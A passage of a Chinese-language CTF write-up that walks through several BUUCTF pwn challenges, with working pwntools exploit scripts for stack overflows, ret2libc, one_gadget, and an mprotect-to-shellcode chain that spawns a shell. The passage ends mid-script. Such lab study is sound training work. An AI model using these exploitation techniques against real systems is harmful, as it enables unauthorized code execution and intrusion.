-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27511</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>但是不知道为啥执行出来不是这么个效果</p>
-<p>在网上查了一些给的exp也是这样的，感觉有点问题</p>
-<p>最后发现这样的两个exp可以执行出结果</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x401198</span>)+p64(<span class="number">0x401186</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">15</span>+p64(<span class="number">0x401186</span>)</span><br></pre></td></tr></table></figure>
-
-<p>有点疑惑，15个a的难道不是覆盖了rbp吗，好像没有覆盖返回地址呀</p>
-<p>23个a的那个里面<code>0x401198</code>是fun函数结束的地址</p>
-<p>没想明白是怎么回事，查到了一个资料这样写着</p>
-<blockquote>
-<p>看了网上那些wp，经过研究思考发现，应该是他们使用23个‘a’覆盖时，多覆盖了8个’a‘，将Main函数栈顶覆盖了。我们知道call指令是先将当前ip指向位置压入栈的，多覆盖8字节正好将ip覆盖了，导致无法返回，从而get shell失败。<br>解决办法：payload=‘a’ * 23+ p64(0x401198) + p64(0x401186) #0x401198为返回地址</p>
-</blockquote>
-<p>感觉不太对，但是目前还没想明白这个原因是什么</p>
-<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>首先查看一下安全措施</p>
-<p><img src="image-20200521151406290.png"></p>
-<p>全都没开，毕竟是一道一分题，应该不会太难</p>
-<p>运行一下的效果，一个输出一个输入然后结束</p>
-<p>拖到IDA里面看一下</p>
-<p><img src="image-20200521151712916.png"></p>
-<p>几个输出之后最后调用了一个<code>gets</code>函数</p>
-<p>前面输出的内容中输出了一个函数的地址</p>
-<p>这个函数内容就是<code>cat flag</code></p>
-<p><img src="image-20200521151828614.png"></p>
-<p>思路应该是差不多的，先填充v5到rbp的40h个字节</p>
-<p>之后填充rbp，最后覆盖返回地址为WoW函数的地址</p>
-<p>很奇怪的是，在本地运行的时候</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x40060d</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这样可以得到结果，而加了8个字节之后就不行了</p>
-<p>但是远程的时候</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)+p64(<span class="number">0x40060d</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这样才能得到正确结果</p>
-<p>怀疑是不是本地的虚拟机有点问题，可能是libc版本之类的</p>
-<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>首先还是查看一下安全机制</p>
-<p><img src="image-20200521154003798.png"></p>
-<p>发现开启了NX，栈上禁止执行，但是这些简单的题目一般也用不到</p>
-<p>拖到IDA里面看看</p>
-<p>main函数直接调用了vuln</p>
-<p><img src="image-20200521154215022.png"></p>
-<p>vuln里面就是一个printf一个fgets</p>
-<p>中间对gets的输入做了一些处理</p>
-<p><img src="image-20200521160749065.png"></p>
-<p>输入中的I会被替换为you</p>
-<p>最后又使用strcpy填充回去s的位置</p>
-<p><img src="image-20200521161353701.png"></p>
-<p>对输入本身存在长度限制，多于32长度的内容会被丢弃</p>
-<p><img src="image-20200521161302184.png"></p>
-<p>但是这个s数组和ebp相距0x3c，60显然是超过32的</p>
-<p><img src="image-20200521161252038.png"></p>
-<p>所以我们需要通过填充I，利用这个转换为you的机制填充中间的内容，最后覆盖返回地址为get_flag</p>
-<p><img src="image-20200521161437093.png"></p>
-<p>构造出exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)</span><br><span class="line">payloads = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F0D</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payloads)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>首先检查一下保护机制</p>
-<p><img src="image-20200521165649983.png"></p>
-<p>同样只有NX</p>
-<p>main函数中的设置了一个buf，之后调用了另一个func</p>
-<p><img src="image-20200521203023180.png"></p>
-<p>这个调用的func很神奇</p>
-<p><img src="image-20200521203057408.png"></p>
-<p><code>gets</code>了一个v1</p>
-<p>但是比较的却是v2的值，如果v2满足条件就可以执行</p>
-<p>看到v1距离rbp有30h</p>
-<p>v2距离rbp只有4h，因此首先要填补这之间的差值</p>
-<p>之后加上一个float的值11.28125就可以了</p>
-<p>这里python在计算float值时有点麻烦，不如直接在IDA里比对这个11.28125的二进制值</p>
-<p><img src="image-20200521205842979.png"></p>
-<p>exp也比较简单</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019_n_1&#x27;</span>)</span><br><span class="line">payloads = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span><span class="number">-0x4</span>)+p32(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payloads)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>首先还是看一下安全机制</p>
-<p><img src="image-20200521213720001.png"></p>
-<p>是个64位程序，开了NX</p>
-<p>运行的时候是一个加密解密的程序</p>
-<p><img src="image-20200521213626806.png"></p>
-<p>选择加密的话可以返回密文，但是选择解密会告诉你让你自己解</p>
-<p>拖到IDA看一看</p>
-<p>main函数代码反编译的挺清晰</p>
-<p><img src="image-20200521214208274.png"></p>
-<p>这里在加密时输入的内容比较长的话会出现段错误</p>
-<p><img src="image-20200521215200612.png"></p>
-<p>encrypt函数这里s数组在输入时可能会溢出</p>
-<p><img src="image-20200521215620358.png"></p>
-<p>但是这次的程序里没有找到之前那几个题目里面那样可以直接得到shell或者是直接读flag的函数</p>
-<p>所以需要ROP的技巧</p>
-<p>查看got和plt表，发现没有exec和system之类的函数，所以不是简单的返回到代码段就可以做出来</p>
-<p>这道题需要用ret2libc来做</p>
-<ol>
-<li>泄漏出某个函数的地址</li>
-<li>通过这个地址计算出libc的基址</li>
-<li>计算<code>system(&#39;/bin/sh&#39;)</code>的地址</li>
-<li>再次溢出，跳到system函数得到shell</li>
-</ol>
-<p>可以看到这个encrypt函数没有对s的输入长度进行限制，如果我们希望溢出的话，首先要覆盖50h长度到达rbp，之后覆盖8个字节，即64位的rbp，最后是返回地址</p>
-<p>payloads大概是这样的:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + ret_addr</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h3><p>逆向代码中看到调用了puts，所以首先可以利用这个puts函数泄漏libc的基地址</p>
-<p>64位程序传递参数时，如果参数少于7个，会依次放在rdi、rsi、rdx、rcx、r8、r9中</p>
-<p>后面的参数才会放在栈中</p>
-<p>所以首先要获取到的gadget就是能从栈中将数据传入到rdi的</p>
-<p><img src="image-20200522173556823.png"></p>
-<p>通过ROPgadget获取到<code>pop rdi</code>的地址</p>
-<p>泄漏puts地址的思路主要是通过rop运行puts函数，同时控制参数使得输出的内容是puts在got表中的真实值，这样就可以输出puts在内存中的实际地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + pop_rdi + puts_got + puts_plt + start</span><br></pre></td></tr></table></figure>
-
-<p>这里面加入这一个start，是希望在执行完<code>pop rdi; ret</code>的时候能够回到程序开始的位置</p>
-<p>但是实际上，构造好了payload之后，在encrypt函数return之前，对数组s进行了一个操作，就是上面逆向代码中循环的部分，好在这个操作不是很难，直接是通过ascii对字符简单的异或，因此我们的payload在发送之前也经过一个对应的解密操作就可以了</p>
-<p>获取到puts的真实地址后就可以计算出实际的libc基地址</p>
-<p>之后利用one_gadget搜索这个给定的libc中存在的<code>execve(&quot;/bin/sh&quot;)</code></p>
-<p><img src="image-20200625064345899.png" alt="image-20200625064345899"></p>
-<p>测试之后第二个地址是可以使用的，另外两个都会崩溃</p>
-<p>通过偏移计算出对应的实际地址</p>
-<p>最后再一次执行main函数，溢出到这个位置即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s</span>):</span></span><br><span class="line">    s = ord(s)</span><br><span class="line">    <span class="keyword">if</span> s&lt;=<span class="number">96</span> <span class="keyword">or</span> s&gt;<span class="number">122</span>:</span><br><span class="line">        <span class="keyword">if</span> s&lt;=<span class="number">64</span> <span class="keyword">or</span> s &gt;<span class="number">90</span>:</span><br><span class="line">            <span class="keyword">if</span> s&gt;<span class="number">47</span> <span class="keyword">and</span> s&lt;=<span class="number">57</span>:</span><br><span class="line">                <span class="keyword">return</span> chr(s^<span class="number">0xf</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> chr(s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> chr(s^<span class="number">0xe</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> chr(s^<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;27487&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"><span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">payloads1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">payloads1 = <span class="string">&#x27;&#x27;</span>.join([encrypt(x) <span class="keyword">for</span> x <span class="keyword">in</span> payloads1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payloads1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_real = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">print(puts_real)</span><br><span class="line"></span><br><span class="line">libc_base = puts_real - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">execve_real = libc_base+ <span class="number">0x4f322</span></span><br><span class="line"><span class="comment"># 0x4f2c5 </span></span><br><span class="line"><span class="comment"># 0x4f322</span></span><br><span class="line"><span class="comment"># 0x10a38c</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payloads2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(execve_real)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payloads2)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先checksec检查安全机制</p>
-<p><img src="image-20200625121418899.png" alt="image-20200625121418899"></p>
-<p>这还是很少见的开启Full RELRO的程序</p>
-<p>拖到ida看一下主函数的逻辑</p>
-<p><img src="image-20200625123543553.png" alt="image-20200625123543553"></p>
-<p>这个函数里面没有溢出点，打开了<code>/dev/urandom</code>读出其中4个字节，赋值给<code>buf</code></p>
-<p>之后buf再作为一个函数的参数，得到v2</p>
-<p>最后再将v2作为参数传入一个函数运行，下面看一下这两个函数的逻辑</p>
-<p><img src="image-20200625123736584.png" alt="image-20200625123736584"></p>
-<p>这个函数的参数是buf作为int的值，看到下面有一个<code>strncmp</code>的<code>if</code>语句，如果值为不为0就会导致直接exit</p>
-<p>所以这里需要buf和s的值相等，向上倒推</p>
-<p>局部变量buf是在上面<code>read(0,buf,0x20u)</code>从stdin输入的0x20个字节内容</p>
-<p>而s是在<code>sprintf(&amp;s,&quot;%ld&quot;,a1)</code>这里被赋值为<code>a1</code>，即整个函数的参数，main函数中的<code>buf</code></p>
-<p>最终返回的这个v5乍一看不存在赋值的语句，但是实际上看到内存中buf位于<code>ebp-2Ch</code>，v5位于<code>ebp-25h</code>，而且这里read读取的过程允许读最多0x20的长度，因此是可以覆盖v5字节，控制返回值的</p>
-<p>最后看一下上面v2作为参数的函数</p>
-<p><img src="image-20200625125242661.png" alt="image-20200625125242661"></p>
-<p>这个函数的输入是上面返回的v5，大小是我们可以控制的</p>
-<p>当这个字节的值是127时，可以从stdin读取长度<code>0xC8</code>的内容，其他值时就可以读取a1长度的内容</p>
-<p>而buf距离ebp有E7h，因此肯定要尽可能的大，这里尽量控制返回值为0xff，必须要求e7h以上才可以</p>
-<h3 id="编写payload"><a href="#编写payload" class="headerlink" title="编写payload"></a>编写payload</h3><h4 id="溢出sub-804871f"><a href="#溢出sub-804871f" class="headerlink" title="溢出sub_804871f"></a>溢出sub_804871f</h4><p>整体思路就是利用<code>sub_804871F</code>来溢出控制返回值v5，再利用<code>sub_80487d0</code>来溢出拿到shell</p>
-<p>但是利用<code>sub_804871f</code>的前提是要绕过<code>strncmp</code>函数</p>
-<p>仔细看一下这个比较</p>
- <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v1=<span class="built_in">strlen</span>(buf);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf,&amp;s,v1))</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-
-<p>这里控制比较长度的v1是利用strlen读取了buf的长度，而这个buf是我们可以人为控制的</p>
-<p>并且strlen函数是遇到<code>\x00</code>字节就会停止的，因此可以控制v1为0，使得两个比较恒等</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">6</span> + <span class="string">&#x27;\xff&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样就可以溢出<code>sub_804871F</code>，控制返回值v5值为0xff</p>
-<h4 id="溢出得到write真实地址"><a href="#溢出得到write真实地址" class="headerlink" title="溢出得到write真实地址"></a>溢出得到write真实地址</h4><p>控制了返回值v5之后，在80487d0这个函数这里就可以读取长度ffh的内容了</p>
-<p>这里payload就和常规的rop差不多了，首先泄漏write的地址，计算出libc基地址</p>
-<p>之后利用gadget搜索跳转到<code>execve(&quot;bin/sh&quot;)</code>即可</p>
-<p>首先是填充buf到ebp的e7h，之后填充4个字节的ebp，最后是返回值</p>
-<p>这里因为程序之前运行过write，就直接暴露write的地址即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + write_plt + start + <span class="number">1</span> + write_got + <span class="number">4</span></span><br></pre></td></tr></table></figure>
-
-<p>这个payload执行完成之后会输出write的真实地址，并且再一次回到程序开始运行的地方</p>
-<p>之后计算出libc的基地址即可</p>
-<h4 id="溢出得到shell"><a href="#溢出得到shell" class="headerlink" title="溢出得到shell"></a>溢出得到shell</h4><p>在得到基地址之后，再一次执行上面的流程，跳到gadget的位置即可</p>
-<p><img src="image-20200625133907380.png" alt="image-20200625133907380"></p>
-<p>首先要把控制返回值v5的payload发送一遍，之后的payload应该是下面这样子</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(execve_sh)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>写payload的时候发现符号表里没有main，所以main的地址要用IDA直接看</p>
-<p>one_gadget的这些gadget测试之后发现都没有办法成功拿到shell</p>
-<p>所以要尝试一下system函数</p>
-<p>这就需要再从libc的符号表读出来system的偏移</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28595&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x8048825</span></span><br><span class="line">bin_sh_offset = next(libc.search(<span class="string">&quot;bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(start) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_real = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = write_real - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh_str = libc_base + bin_sh_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve_sh = libc_base + 0x5f066</span></span><br><span class="line"><span class="comment"># 0x3a80c</span></span><br><span class="line"><span class="comment"># 0x3a80e</span></span><br><span class="line"><span class="comment"># 0x3a812</span></span><br><span class="line"><span class="comment"># 0x3a819</span></span><br><span class="line"><span class="comment"># 0x5f065</span></span><br><span class="line"><span class="comment"># 0x5f066</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(system_addr) + <span class="string">&quot;AAAA&quot;</span> + p32(bin_sh_str)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>调用system函数的时候，<code>aaaa</code>是system的返回地址，用来占位</p>
-<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><h3 id="基本分析-1"><a href="#基本分析-1" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先checksec检查安全机制</p>
-<p><img src="image-20200625194857123.png" alt="image-20200625194857123"></p>
-<p>同样是开启了NX的程序</p>
-<p>可能也是一道ROP的题目</p>
-<p>看了逆向的代码之后发现和<code>ciscn_2019_c_1</code>几乎一样，两道题目唯一的区别就是之前那个题附带给了libc，这个题没有给libc的文件</p>
-<p>所以主要改的地方就是libc的利用这里</p>
-<p>从原本的直接读本地libc，改成利用<code>LibcSearcher</code></p>
-<p>两道题目甚至可以用同一个exp</p>
-<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><h3 id="基本分析-2"><a href="#基本分析-2" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先看到main函数</p>
-<p><img src="image-20200730150103790.png" alt="image-20200730150103790"></p>
-<p>一个printf一个gets，main函数的逻辑还是挺简单的</p>
-<p>看到旁边的函数，有一个<code>get_flag</code></p>
-<p><img src="image-20200730151448182.png" alt="image-20200730151448182"></p>
-<p>这里的<code>get_flag</code>不是简单的直接读文件，还存在两个条件判断，判断了a1、a2两个数的值</p>
-<p>而这两个数是<code>get_flag</code>的参数，也就是说在构造payload的时候需要将a1、a2两个参数的值附上，或者需要直接跳转到这两个条件判断之后的代码</p>
-<p>差点忘了要检查一下安全机制：</p>
-<p><img src="image-20200730154608035.png" alt="image-20200730154608035"></p>
-<p>发现开启了NX，不过这里开了NX也影响不大，毕竟二进制程序本身就包含了读文件的函数，直接跳转过去执行就可以了</p>
-<p>TextView里面看一下<code>get_flag</code>的地址偏移</p>
-<p><img src="image-20200730154806723.png" alt="image-20200730154806723"></p>
-<p>按着这个思路本来写了这样的一个payload</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">0x80489a0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>但是程序自己直接就退出了，而且连本来的printf都不输出了</p>
-<p>改成</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489a0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这样之后，printf就可以输出了，但是还是没有读到flag里面的内容；这一步其实有些问题，为什么不用覆盖ebp呢，没有这四个a的话地址不是覆盖着ebp而不是ra吗？</p>
-<p>之后如果改成</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489b8</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这样会直接跳到两个条件判断之后，就可以读出来flag的内容了</p>
-<p><img src="image-20200731111433918.png" alt="image-20200731111433918"></p>
-<p>但是这样的程序其实是存在问题的，因为直接跳转到了flag函数的内部，会导致栈帧不平衡</p>
-<p>看了网上的一些方法之后，其实还有更好的办法</p>
-<p>函数表中存在一个<code>mprotect</code>函数</p>
-<p><img src="image-20200731120253306.png" alt="image-20200731120253306"></p>
-<p>这个函数作用是修改用户态内存段的权限</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>会把从<code>start</code>开始，长度为<code>len</code>的内存空间权限修改为<code>prot</code></p>
-<p>其中prot取值有四个</p>
-<ul>
-<li><code>PROT_READ</code></li>
-<li><code>PROT_WRITE</code></li>
-<li><code>PROT_EXEC</code></li>
-<li><code>PROT_NONE</code></li>
-</ul>
-<p>程序函数表中引入了这个函数，就可以首先用这个函数修改bss段中的一部分为可执行，之后用read函数写入shellode，最后再跳转到shellcode</p>
-<p>指定的内存大小至少要是一个内存页(4k)，并且起始位置也必须是一个内存页的开始位置</p>
-<p>首先可以看一下进程的内存空间，将进程后台运行后直接查看<code>/proc/pid/maps</code>，这里会写出来进程内存空间的权限和起始地址</p>
-<p><img src="image-20200731121934216.png" alt="image-20200731121934216"></p>
-<p>图例可以看到进程在<code>80ea000</code>到<code>80ec000</code>的区域是可以读写的，并且属于进程自己的空间</p>
-<p>所以我们可以选这里的中间，<code>80eb000</code>这里开始，增加一段具有执行权限的区域，想要执行的语句应该是</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mprotect(<span class="number">0x80eb000</span>,<span class="number">0x1000</span>,<span class="number">7</span>);</span><br></pre></td></tr></table></figure>
-
-<p>这条指令之后，从<code>0x80eb000</code>这里到<code>0x80ed000</code>这一段内存就变成了可读可写可执行的权限，下面就需要向其中写入shellcode</p>
-<p>调用mprotect这里函数结束之后，下面想要调用read函数，但是这时堆栈中mprotect的三个参数就占了位置，所以需要pop出来3个参数，调整堆栈，使得read函数的地址在栈顶，这样就可以直接用ret跳转到read函数的位置，所以用ROPGadget再搜索一下三个pop的gadget</p>
-<p><img src="image-20200731190353655.png" alt="image-20200731190353655"></p>
-<p>得到这样的一条指令。下面payload就需要调用mprotect，并且平衡堆栈</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3)</span><br></pre></td></tr></table></figure>
-
-<p>这三个pop的gadget的位置是mprotect执行完后的下一条指令</p>
-<p>read函数定义如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *buf,<span class="keyword">size_t</span> count;)</span> </span></span><br></pre></td></tr></table></figure>
-
-<p>这里想要执行的是将shellcode从输入直接写到内存，所以fd可以设为1，表示从标准stdin接受输入</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += p32(read) + p32(<span class="number">1</span>) + p32(<span class="number">0x80ec000</span>) + p32(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure>
-
-<p>当read被执行之后程序应该是又一次进入了等待输入的状态，这时就发送另一个payload，用于获取到权限;这个可以用pwntools自带的shellcraft来生成</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p> 这个发送过去之后进入<code>interactive</code>状态就可以了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26403</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop3_addr = <span class="number">0x80483b8</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(pop3_addr) + p32(<span class="number">0x80eb000</span>) + p32(<span class="number">0x1000</span>) + p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">payload1 += p32(read) + p32(<span class="number">1</span>) + p32(<span class="number">0x80eb000</span>) + p32(<span 